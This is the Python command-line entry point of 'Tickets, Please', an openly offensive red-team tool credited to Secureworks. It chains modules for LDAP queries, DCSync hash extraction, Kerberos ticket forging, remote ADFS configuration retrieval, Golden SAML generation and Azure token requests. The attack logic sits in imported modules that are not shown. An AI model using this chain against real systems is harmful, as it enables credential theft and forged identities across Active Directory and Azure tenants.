# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import base64
import asyncio
import logging
import argparse
from ticketsplease import __version__
from ticketsplease.parser import (
    ldap_args,
    dcsync_args,
    ticket_args,
    adfs_args,
    saml_args,
    azure_args,
)
from ticketsplease.modules import (
    LDAP,
    DCSYNC,
    create_ticket,
    get_configuration,
    generate_golden_saml,
    request_access_token,
)


def get_args() -> argparse.Namespace:
    """Parse command line args"""
    p = argparse.ArgumentParser(
        description=f"Tickets, Please: Ticket/Token Generator | v{__version__}"
    )

    # Build sub parsers for each module
    subparsers = p.add_subparsers(help="Ticket/Token Generation Modules", dest="module")
    ldap_args(subparsers)
    dcsync_args(subparsers)
    ticket_args(subparsers)
    adfs_args(subparsers)
    saml_args(subparsers)
    azure_args(subparsers)
    p.add_argument("--debug", action="store_true", help="Enable debugging.")
    args = p.parse_args()

    # Handle no module provided
    if not args.module:
        p.error("please specify a module")
        p.print_help()

    return args


def run():
    """Entry point for TicketsPlease"""
    args = get_args()

    # Initialize logging level and format
    if args.debug:
        logging_level = logging.DEBUG
        logging_format = (
            "[%(asctime)s] %(levelname)-5s - %(filename)17s:%(lineno)-4s - %(message)s"
        )
    else:
        logging_level = logging.INFO
        logging_format = "[%(asctime)s] %(levelname)-5s: %(message)s"

    logging.basicConfig(format=logging_format, level=logging_level)
    logging.addLevelName(logging.WARNING, "WARN")

    # Query LDAP for a given user or the DKM
    if args.module == "ldap":
        if args.target_user:
            (upn, guid, sid) = LDAP.get_user(
                domain=args.domain,
                host=args.host,
                user=args.username,
                password=args.password,
                target_user=args.target_user,
            )
        else:
            dkm_key = LDAP.get_dkm(
                domain=args.domain,
                host=args.host,
                user=args.username,
                password=args.password,
            )

        # The LDAP module itself will output the retrieved data

    # Perform a DCSync to retrieve a SID and hash for
    # a given user
    elif args.module == "dcsync":
        (user_sid, user_hash) = asyncio.run(
            DCSYNC.run(
                dc_ip=args.dc_ip,
                domain=args.domain,
                target_user=args.target_user,
                username=args.username,
                password=args.password,
                hash=args.hash,
            )
        )

        # The DCSYNC module itself will output the retrieved data

    # Generate a Kerberos ticket
    elif args.module == "ticket":
        # Generate a kerberos ticket
        (krb_ticket, cipher, sessionKey) = create_ticket(
            domain=args.domain,
            host=args.spn_host,
            user=args.target_user,
            user_sid=args.target_user_sid,
            user_password=args.target_user_password,
            user_hash=args.target_user_hash,
            domain_username=args.domain_username,
            domain_password=args.domain_password,
            domain_hash=args.domain_hash,
            dc_ip=args.dc_ip,
            ap_req=args.ap_req,
        )

        sKey = sessionKey.contents
        b64_sKey = base64.b64encode(sKey).decode()
        logging.info(f"[ + ] Raw Kerberos Key:    {sKey}")
        logging.info(f"[ + ] Base64 Kerberos Key: {b64_sKey}")
        logging.info(f"[ + ] Base64 Kerberos Ticket:\n{krb_ticket}")

    # Remote pull down of ADFS Configuration
    elif args.module == "adfs":
        # Retrieve the ADFS Configuration
        # Default cipher to None as we assume RC4
        configuration = get_configuration(
            adfs_host=args.adfs_host,
            ticket=args.krb_ticket,
            sessionKey=args.krb_key,
            cipher=None,
            output=args.output,
        )

        logging.info(f"[ + ] ADFS Configuration:\n{configuration}")

    elif args.module == "saml":
        # Generate a Golden SAML token
        golden_saml = generate_golden_saml(
            adfs_config=args.adfs_config,
            adfs_config_file=args.adfs_config_file,
            domain=args.domain,
            target_user=args.target_user,
            target_user_upn=args.target_user_upn,
            target_user_guid=args.target_user_guid,
            domain_username=args.domain_username,
            domain_password=args.domain_password,
            dc_ip=args.dc_ip,
            dkm_key=args.dkm_key,
            assertion=args.assertion,
        )

        logging.info(f"[ + ] Golden SAML Token:\n{golden_saml}")

    elif args.module == "azure":
        # Request an access token for a specified Azure API endpoint
        (access_token, refresh_token) = request_access_token(
            domain=args.domain,
            api=args.api,
            api_tenant=args.api_tenant,
            krb_ticket=args.krb_ticket,
            saml_token=args.saml_token,
        )

        logging.info(f"[ + ] Access Token:\n{access_token}")
        logging.info(f"[ + ] Refresh Token:\n{refresh_token}")

    else:
        raise ValueError(f"invalid module '{args.module}'")
